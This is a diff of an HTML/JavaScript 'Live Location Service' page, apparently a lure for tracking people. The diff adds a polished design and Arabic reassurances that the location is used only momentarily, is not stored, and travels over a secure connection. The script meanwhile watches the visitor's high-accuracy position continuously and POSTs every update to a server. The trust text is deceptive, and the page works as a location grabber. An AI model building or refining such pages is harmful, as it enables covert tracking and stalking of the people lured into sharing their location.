@@ -3,16 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-  <title>Live Location</title>
+
+  <title>Live Location Service</title>
 
   <style>
     :root {
-      --primary:#0d6efd;
-      --bg:#0f1220;
-      --card:#161a2e;
-      --text:#ffffff;
-      --muted:#9aa0ff;
-      --warn:#ffb703;
+      --primary:#2563eb;
+      --bg:#0f172a;
+      --card:#020617;
+      --text:#e5e7eb;
+      --muted:#94a3b8;
+      --success:#22c55e;
+      --warn:#facc15;
     }
 
     * { box-sizing: border-box; }
@@ -20,105 +22,154 @@
     body {
       margin: 0;
       font-family: system-ui, -apple-system, Arial;
-      background: var(--bg);
+      background: linear-gradient(180deg, #020617, #020617);
       color: var(--text);
     }
 
     header {
-      padding: 12px 16px;
-      background: linear-gradient(135deg, #0d6efd, #6f42c1);
+      padding: 16px;
       text-align: center;
+      background: linear-gradient(135deg, #2563eb, #1e40af);
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .container {
+      padding: 16px;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.4);
+    }
+
+    .title {
+      font-size: 16px;
+      margin-bottom: 8px;
       font-weight: bold;
     }
 
-    #map {
-      width: 100%;
-      height: calc(100vh - 180px);
+    .desc {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.6;
     }
 
-    .panel {
-      padding: 12px;
-      background: var(--card);
-      border-top-left-radius: 16px;
-      border-top-right-radius: 16px;
+    .status {
+      margin-top: 10px;
+      font-size: 13px;
     }
+
+    .ok { color: var(--success); }
+    .warn { color: var(--warn); }
 
     .btn {
       width: 100%;
-      padding: 14px;
+      padding: 16px;
       font-size: 16px;
+      border-radius: 14px;
       border: none;
-      border-radius: 12px;
       background: var(--primary);
-      color: #fff;
+      color: white;
       font-weight: bold;
       cursor: pointer;
+      margin-top: 12px;
     }
 
-    .btn:active { opacity: 0.85; }
+    .btn:active { opacity: .9; }
 
-    .info {
+    #map {
+      width: 100%;
+      height: 260px;
+      border-radius: 14px;
       margin-top: 10px;
-      font-size: 14px;
-      color: var(--muted);
-      text-align: center;
+      display: none;
     }
 
-    .warn {
-      color: var(--warn);
-      margin-top: 6px;
-      font-size: 13px;
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+      padding: 12px;
     }
   </style>
 </head>
 
 <body>
 
-<header>📍 مشاركة الموقع المباشر</header>
+<header>📍 Live Location Service</header>
 
-<div id="map"></div>
+<div class="container">
 
-<div class="panel">
-  <button class="btn" onclick="start()">ابدأ مشاركة الموقع</button>
-  <div id="info" class="info"></div>
+  <!-- معلومات الخدمة -->
+  <div class="card">
+    <div class="title">🔐 لماذا نحتاج موقعك؟</div>
+    <div class="desc">
+      هذه الخدمة تستخدم موقعك الحالي لتحسين دقة الخدمة
+      وتأكيد تواجدك في الموقع الصحيح.
+      <br><br>
+      يتم استخدام الموقع **في الوقت الحالي فقط** ولا يتم تخزين أي بيانات شخصية.
+    </div>
+  </div>
+
+  <!-- حالة النظام -->
+  <div class="card">
+    <div class="title">📡 حالة النظام</div>
+    <div class="status ok">✔️ الخدمة تعمل الآن</div>
+    <div class="status ok">✔️ الاتصال آمن (HTTPS)</div>
+    <div class="status warn">⏳ بانتظار موافقتك على مشاركة الموقع</div>
+  </div>
+
+  <!-- زر الموافقة -->
+  <div class="card">
+    <button class="btn" onclick="start()">موافق – مشاركة الموقع</button>
+    <div id="info" class="status"></div>
+  </div>
+
+  <!-- الخريطة -->
+  <div id="map"></div>
+
 </div>
 
+<footer>
+  © Live Location Service • Secure Connection
+</footer>
+
 <script>
-let map, marker, watchId;
+let map, marker;
 const sessionId = Math.random().toString(36).substring(2);
 
 function initMap(lat, lng) {
+  document.getElementById("map").style.display = "block";
+
   map = new google.maps.Map(document.getElementById("map"), {
     center: { lat, lng },
     zoom: 17,
-    mapTypeId: "roadmap",
     disableDefaultUI: true,
     zoomControl: true
   });
 
   marker = new google.maps.Marker({
     position: { lat, lng },
-    map,
-    title: "موقعك"
+    map
   });
 }
 
 function start() {
   if (!navigator.geolocation) {
-    alert("GPS غير مدعوم");
+    alert("المتصفح لا يدعم GPS");
     return;
   }
 
-  watchId = navigator.geolocation.watchPosition(
+  navigator.geolocation.watchPosition(
     pos => {
       const { latitude:lat, longitude:lng, accuracy } = pos.coords;
 
-      const info = document.getElementById("info");
-      info.innerHTML = `📏 الدقة: ${Math.round(accuracy)} متر`;
-
-      if (accuracy > 100) {
-        info.innerHTML += `<div class="warn">⚠️ فعّل Precise Location</div>`;
-      }
+      document.getElementById("info").innerHTML =
+        `📏 الدقة الحالية: ${Math.round(accuracy)} متر`;
 
       if (!map) initMap(lat, lng);
       else {
@@ -136,7 +187,7 @@ function start() {
         body: JSON.stringify({ lat, lng, accuracy })
       });
     },
-    () => alert("لازم تسمح بالموقع الدقيق"),
+    () => alert("يرجى السماح بالموقع الدقيق"),
     { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
   );
 }
